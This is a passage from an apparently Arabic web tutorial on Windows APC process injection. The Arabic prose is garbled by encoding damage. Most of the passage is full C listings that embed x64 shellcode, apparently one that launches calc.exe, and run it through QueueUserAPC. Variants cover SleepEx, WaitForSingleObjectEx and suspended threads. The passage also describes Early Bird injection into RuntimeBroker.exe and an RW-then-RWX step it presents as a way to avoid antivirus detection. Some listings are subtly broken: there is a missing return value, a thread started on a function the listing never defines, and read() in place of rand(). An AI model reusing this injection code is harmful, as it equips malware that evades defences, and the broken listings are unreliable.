                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
                        
                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
                        
                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
                        
                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
                        
                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br><br>
                        
                        }<br><br>
                        
                        VOID AlertableFunction() {<br>
                            &nbsp;&nbsp;SleepEx(INFINITE, TRUE);<br>
                        }<br><br>
                        
                        int main() {<br><br>
                        
                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
                        
                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, NULL, NULL);<br>
                            &nbsp;&nbsp;if (hThread == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
                                    &nbsp;&nbsp;getchar();<br><br>
                        
                                    &nbsp;&nbsp;return 0;<br>
                        }<br>
                </code></div><br>
                <h2 style="direction: ltr;">2. WaitForSingleObjectEx()</h2>
                <p>[+] ููุชููู ุน ุทุฑููุฉ ุชุงููุฉ ุจุชุฎูู ุงูู Thread ูู Alertable State ุฒู ()SleepEx ุ ููู ุงูู
                    <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code> .. ูุงููุฑู ุฅู ุจุฏู ูู
                    ุงูุซุฑูุฏ ุจูููู ูุฌุฑุฏ ูุงูู ููุณุชูู (sleep) ุ ููุง ูู <code
                        style="background: gold; font-size: 14px;">ุจูุณุชูู ุญุฏุซ ูุนูู (Event) ูุญุตู</code> ุ ู ุงูุซุฑูุฏ ูุด
                    ุจูุดุชุบู ูุญุฏ
                    ูู ูุญุตู ุงูุญุฏุซ ุฏู ุ ุจุณ ูู ูู APC Call ูุชุณุฌูุฉ ุนููุฉ ุ
                    ุงููููุฏูุฒ ููููุฐูุง ููุช ุงูุงูุชุธุงุฑ ุ ูุฏู ุจูุณูุญ ุจุชูููุฐ ููุฏ ูุนูู ูู ููุณ ุงูุชูููุช ูู ุบูุฑ ูู ุงูุซุฑูุฏ ูุฎุฑุฌ ูู
                    ุญุงูุฉ ุงูุงูุชุธุงุฑ.
                </p>
                <p style="font-weight: bold;">[+] ููุง ูุดูู ุงูููุฏ :</p>
                <ol>
                    <li style="font-weight: bold;">ูุงููุดู ุงูู Alertable :</li>
                    ููุง ููุบูุฑ ุงูุฌุฒุก ูู ุงูููุฏ ุงููู ูุงุช ูู ุญุชุฉ ุงูู ()SleepEx ุ ูููุถูู ุงููุงููุดู ุงูุฌุฏูุฏุฉ.
                    <ul>
                        <li>ุฃูู ุญุงุฌุฉ ุจูุณุชุฎุฏู <code style="background: gold; font-size: 14px;">()CreateEvent</code> ุนุดุงู
                            ููุดุฆ ุญุฏุซ (Event) ุ ูุฏู ุจูููู ุฒู Signal ุฃู ุฅุดุงุฑุฉ ูุฏุง ููุฏุฑ
                            ุงูุซุฑูุฏ ูุณุชูุงูุง.</li>
                        <li>ุจุนุฏ ูุฏู <code style="background: gold; font-size: 14px;">()WaitForSingleObjectEx</code>
                            ุจุชุฎูู ุงูุซุฑูุฏ ูุณุชูู ุงูุญุฏุซ ุฏู ูููุช ุบูุฑ ูุญุฏูุฏ (<code
                                style="background: gold; font-size: 14px;">INFINITE</code>) ุ ุจุณ
                            ูุน
                            ุชุดุบูู <code style="background: gold; font-size: 14px;">Alertable Mode (TRUE)</code> ุ ูุฏู
                            ูุนูุงู ุฅูู ูู ูู APC Call ูุชุณุฌูุฉ ุน ุงูุซุฑูุฏ ุ ูุชุชููุฐ ููุช
                            ุงูุงูุชุธุงุฑ.</li>
                        <li>ูุขุฎุฑ ุญุชุฉ ููุง ูุฎูุต ุจูููู ุงูู Handle ุจุชุงุน ุงูุญุฏุซ ุจุงุณุชุฎุฏุงู <code
                                style="background: gold; font-size: 14px;">CloseHandle(hEvent)</code>.</li>
                    </ul>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/WaitForSingleObjectEx-1.png" alt="APC-Injection-8" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ููุง ูู ุฑู :</p>
                <ul>
                    <li>ุชูุงู โ</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/WaitForSingleObjectEx-2.png" alt="APC-Injection-9" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p>[+] ุงูููุฏ ุงูููุงุฆู :</p>
                <div class="code-block"><code>
                    #include &lt;Windows.h><br>
                        #include &lt;stdio.h><br><br>
                        
                        unsigned char Payload[] = {<br>
                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
                        
                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
                        
                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
                        
                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
                        
                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br><br>
                        
                        }<br><br>
                        
                        VOID AlertableFunction() {<br><br>
	
                            &nbsp;&nbsp;HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);<br>
                            &nbsp;&nbsp;if (hEvent) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;WaitForSingleObjectEx(hEvent, INFINITE, TRUE);<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hEvent);<br>
                                &nbsp;&nbsp;}<br>
                        }<br><br>
                        
                        int main() {<br><br>
                        
                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
                        
                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, NULL, NULL);<br>
                            &nbsp;&nbsp;if (hThread == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
                                    &nbsp;&nbsp;getchar();<br><br>
                        
                                    &nbsp;&nbsp;return 0;<br>
                        }<br>
                </code></div><br>
                <h2 style="direction: ltr;">3. Suspended Thread :</h2>
                <p>[+] ุฏูููุชู ููุชููู ุนู ุงูู <code style="background: gold; font-size: 14px;">Suspended Threads</code> ุ
                    ูุฏู ุจุจุณุงุทุฉ ุซุฑูุฏุงุช ุจููุดุฆูุง ุจุณ ุจุฏู ูู ุชุดุชุบู ุน ุทูู ุ ุจุชุจุฏุฃ
                    ููู
                    ูุชูููุฉ (Suspended) ุ ูุนูู ููุฌูุฏุฉ ูู ุงูููููุฑู ุจุณ ูุด ุดุบุงูุฉ ูุณู .. ุงูููุฒุฉ ูู ุงูุทุฑููุฉ ุฏู ุฅูู ุจุชุงุฎุฏ ููุชู
                    ุชุนุฏู ุนูููุง ุฃู ุชุญูู ูููุง ููุฏ ูุนูู ูุจู ูู ุชุดุบููุง ูุฏููุง.</p>
                <p style="font-weight: bold;">[+] ููุง ูุดูู ุงูููุฏ :</p>
                <ol>
                    <li style="font-weight: bold;"> ุงูู DummyFunction :</li>
                    ุฏู ูุฌุฑุฏ ูุงููุดู ุชุฌุฑูุจูุฉ ูุด ุจุชุนูู ุญุงุฌุฉ ูููุฏุฉ ุ ูู ุจุณ ุจุชุณุชุฎุฏู ุนุดุงู ููุดุฆ ุซุฑูุฏ ูููู ูู ุงูู
                    <code style="background: gold; font-size: 14px;">Suspended Mode</code> .. ุงูููุฏ ุงููู ุฌูุงูุง ุนุจุงุฑุฉ ุนู
                    ุนูููุงุช ุญุณุงุจูุฉ ุนุดูุงุฆูุฉ ุจุงุณุชุฎุฏุงู <code style="background: gold; font-size: 14px;">()rand</code> ุ
                    ููุฏูู ุงูุฃุณุงุณู
                    ุฅูู ูููู ูุฌุฑุฏ ุฌุณู ููุซุฑูุฏ ุจุฏูู ุฃู ุชุฃุซูุฑ ุญูููู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/Suspended-1.png" alt="APC-Injection-9" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุงูู Suspended Thread :</li>
                    ุงุณุชุฎุฏููุง <code style="background: gold; font-size: 14px;">CREATE_SUSPENDED</code> ุนุดุงู ุงูุซุฑูุฏ ูุจุฏุฃ
                    ูุชููู (Suspended) ุจุฏู ูู ูููู ุดุบุงู ูู ุงูุจุฏุงูุฉ ุ ูุฏู
                    ุจูุฏููุง ุชุญูู ูุงูู ูุจู ุชุดุบููู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/Suspended-2.png" alt="APC-Injection-10" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุงุณุชุฆูุงู ุชุดุบูู ุงูุซุฑูุฏ.</li>
                    <li style="font-weight: bold;">ุงูุชุธุงุฑ ุงูุชูุงุก ุงูุซุฑูุฏ :</li>
                    ุงูุณุทุฑ ุฏู ุจูุฎูู ุงูุจุฑูุงูุฌ ูุณุชูู ูุญุฏ ูู ุงูุซุฑูุฏ ูุฎูุต ุดุบูู ูุจู ูู ูููู ุชูููุฐ ุจุงูู ุงูููุฏ .. ููุง ุจูุณุชุฎุฏู
                    <code style="background: gold; font-size: 14px;">INFINITE</code> ุนุดุงู ููุถู ููุชุธุฑูู ุจุฏูู ุญุฏ ุฒููู ูุนูู
                    ุ ูุฏู ุจูุถูู ุฅู ุงูู APC ุงููู ุชู ุญูููุง ุฌูู ุงูุซุฑูุฏ ุชุงุฎุฏ
                    ูุฑุตุชูุง ูู ุงูุชูููุฐ ูุจู ูู ุงูุจุฑูุงูุฌ ูููู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/Suspended-3.png" alt="APC-Injection-11" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ููุง ูู ุฑู :</p>
                <ul>
                    <li>ุชูุงู โ</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/Suspended-4.png" alt="APC-Injection-11" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p>[+] ุงูููุฏ ุงูููุงุฆู :</p>
                <div class="code-block"><code>
                    #include &lt;Windows.h><br>
                        #include &lt;stdio.h><br><br>
                        
                        unsigned char Payload[] = {<br>
                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
                        
                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
                        
                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
                        
                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
                        
                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                    &nbsp;&nbsp;}<br><br>
                        
                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                        &nbsp;&nbsp;}<br><br>
                        
                        }<br><br>
                        
                        VOID DummyFunction() {<br><br>

                            int i = read();<br>
                            int j = i + read();<br>
                        }<br><br>
                        
                        int main() {<br><br>
                        
                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
                        
                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, CREATE_SUSPENDED, NULL);<br>
                            &nbsp;&nbsp;if (hThread == NULL) {<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                                &nbsp;&nbsp;}<br><br>
                        
                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                                    &nbsp;&nbsp;ResumeThread(hThread);<br>
                                    &nbsp;&nbsp;WaitForSingleObject(hThread, INFINITE);<br><br>
                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
                                    &nbsp;&nbsp;getchar();<br><br>
                        
                                    &nbsp;&nbsp;return 0;<br>
                        }<br>
                </code></div><br>
                <h2 style="direction: ltr;">4. Remote APC Injection (EarlyBird) :</h2>
                <p>[+] ููุชููู ุฏูููุชู ุน ุทุฑููุฉ ุชุงููุฉ ูุงููู ุจุชูุณุชุฎุฏู ูุชูุฑ ููู APC Injection ููู ุงูู <code
                        style="background: gold; font-size: 14px;">Early Bird APC
                    Injection</code> :</p>
                <ul>
                    <li>ุงูุชูููู ุฏู ุจุจุณุงุทุฉ ุนุจุงุฑุฉ ุนู ุฅููุง <code
                            style="background: gold; font-size: 14px;">ุจูู inject ุงูุดูู ููุฏ ุฌูุง ุจุฑูุณูุณ ุฌุฏูุฏุฉ</code> ูุจู
                        ุญุชู ูู ุชุจุฏุฃ ุชุดุชุบู
                        ุจุดูู ุทุจูุนู.</li>
                    <li>ุงููุฑู ุจููู ูุจูู ุงูุทุฑู ุงููู ุดุฑุญูุงูู ูุจู ูุฏู ูู ุฅููุง ูุด ุจูุญูู ููุฏ ุฌูู ุนูููุฉ ุดุบุงูุฉ ุ ุฅุญูุง ุงููู
                        ุจููุดุฆ ุงูุนูููุฉ ูู ุงูุฃูู ุ ููููููุง ูุฎูููุง ุน ุญุงูุฉ ุงูู Suspend ุ ููุญูู ุงูููุฏ ุจุชุงุนูุง ุ ุจุนุฏูู ูุดุบููุง
                        ุชุงูู ุนุดุงู ุงูุดูู ููุฏ ุจุชุงุนูุง ูุดุชุบู ูุจู ุฃู ุญุงุฌุฉ ุชุงููุฉ.</li>
                </ul>
                <p style="font-weight: bold;">[+] ุชุนุงูู ุฃูููู ุงูููุฑุฉ ูุงูุฎุทูุงุช :</p>
                <ol>
                    <li style="font-weight: bold;">ุชุดุบูู ุนูููุฉ ุฌุฏูุฏุฉ ูุชุนููุฉ (CreateProcessA - Debug Mode) :</li>
                    ูู ุงูุฃูู ุจูุดุบู ุนูููุฉ ุฌุฏูุฏุฉ ููู <code
                        style="background: gold; font-size: 14px;">RuntimeBroker.exe</code> ุจุณ ูุด ุจูุดุบููุง ุน ุทูู .. ูุง ..
                    ุจูุดุบููุง ูู ูุถุน ุงูุชุนููู
                    (<code style="background: gold; font-size: 14px;">Suspended State</code>) ุจุงุณุชุฎุฏุงู <code
                        style="background: gold; font-size: 14px;">CreateProcessA</code> ูุน
                    <code style="background: gold; font-size: 14px;">DEBUG_PROCESS</code>.<br>
                    ุงูููุฑุฉ ููุง ุฅููุง ูููุนูุง ุชุดุชุบู ุทุจูุนู ุ ููุฏู ููุณูุง ูุฑุตุฉ ูุถูู ุงูุดูู ููุฏ ูููุง ุงูุฃูู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-1.png" alt="APC-Injection-12" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุญุฌุฒ ููุงู ูู ุฐุงูุฑุฉ RuntimeBroker.exe :</li>
                    ุจุนุฏ ูู ุงูุนูููุฉ ุงุดุชุบูุช ุจุณ ูุณู ูุชุนููุฉ ุ ุจูุณุชุฎุฏู <code
                        style="background: gold; font-size: 14px;">VirtualAllocEx</code> ุนุดุงู ูุญุฌุฒ ูุณุงุญุฉ ูู ุฐุงูุฑุชูุง ุนุดุงู
                    ูุถูู
                    ูููุง ุงูุดูู ููุฏ.<br>
                    ุงูููุงู ุฏู ุจูููู ุจุตูุงุญูุงุช ูุฑุงุกุฉ ููุชุงุจุฉ (RW) ุงูุฃูู ุ ูุฅูู ูู ูุงู ุชูููุฐ ูุจุงุดุฑ ุ ุจุฑุงูุฌ ุงูุญูุงูุฉ
                    ูุชูุชุดูู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-2.png" alt="APC-Injection-13" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ูุชุงุจุฉ ุงูู Shellcode ูู ุฐุงูุฑุฉ RuntimeBroker.exe :
                    </li>
                    ููุง ุจูุณุชุฎุฏู <code style="background: gold; font-size: 14px;">WriteProcessMemory</code> ุนุดุงู ููุชุจ
                    ุงูุดูู ููุฏ ุฌูู ุงููุณุงุญุฉ ุงููู ุญุฌุฒูุงูุง ูู ุฐุงูุฑุฉ ุงูุนูููุฉ.<br>
                    ูุนูู ุฏูููุชู ุงูููุฏ ุจุชุงุนูุง ุจูู ูุชุฎุฒู ุฌูู RuntimeBroker.exe ุ ุจุณ ูุณู ูุด ุดุบุงู.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-3.png" alt="APC-Injection-14" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุชุบููุฑ ุตูุงุญูุงุช ุงูุฐุงูุฑุฉ ุนุดุงู ูุฎูู ุงูููุฏ ูููุฐ :</li>
                    ุจุนุฏ ูู ูุชุจูุง ุงูููุฏ ุ ุจูุญุชุงุฌ ูุฎููู ูุงุจู ููุชูููุฐ ุ ูู ุจูุณุชุฎุฏู <code
                        style="background: gold; font-size: 14px;">VirtualProtectEx</code> ุนุดุงู ูุบูุฑ ุตูุงุญูุงุช
                    ุงููุณุงุญุฉ ูู RW (ูุฑุงุกุฉ ููุชุงุจุฉ) ุฅูู RWX (ูุฑุงุกุฉ ููุชุงุจุฉ ูุชูููุฐ).
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-4.png" alt="APC-Injection-15" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุชุฌููุฒ ุชุดุบูู ุงูุดูู ููุฏ :</li>
                    ุฏูููุชู ุงูุดูู ููุฏ ุจูู ุฌุงูุฒ ุฌูู ุงูุนูููุฉ ุ ุจุณ ุฅุฒุงู ูุฎููู ูุดุชุบูุ<br>
                    ุจูุณุชุฎุฏู <code style="background: gold; font-size: 14px;">QueueUserAPC</code> ุนุดุงู ูุถูู ุงูุดูู ููุฏ ูู
                    ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูู APC ุงูุฎุงุตุฉ ุจุงูู Thread ุงูุฑุฆูุณู
                    ููุนูููุฉ.<br>
                    ูุนูู ุฃูู ูุง ุงูุนูููุฉ ุชุดุชุบู ุ ุจุฏู ูู ุชููู ุนุงุฏู ุ ุฃูู ุญุงุฌุฉ ุจุชููุฐูุง ูู ุงูููุฏ ุจุชุงุนูุง.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/EarlyBird-APC-5.png" alt="APC-Injection-16" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">ุงุณุชุฆูุงู ุชุดุบูู RuntimeBroker.exe ุนุดุงู ูููุฐ ุงูุดูู ููุฏ :</li>
                    ุขุฎุฑ ุฎุทูุฉ ุจููุตู ุนูููุฉ ุงูุชุตุญูุญ ุจุงุณุชุฎุฏุงู <code
                        style="background: gold; font-size: 14px;">DebugActiveProcessStop</code> ุ ูุฏู ุจูุฎูู
                    RuntimeBroker.exe ูููู
                    ุชุดุบููู.<br>
                    ุจุณ ุจุฏู ูู ูุจุฏุฃ ุนุงุฏู ุ ุจูุดูู ุฃูู ุญุงุฌุฉ ูู ุงูู APC Queue ุ ูุฅุญูุง ุถุงูููู ุงูุดูู ููุฏ ููุงู ุ ูู ููุดุบูุฉ ูุจู
                    ุฃู ุญุงุฌุฉ ุชุงููุฉ.

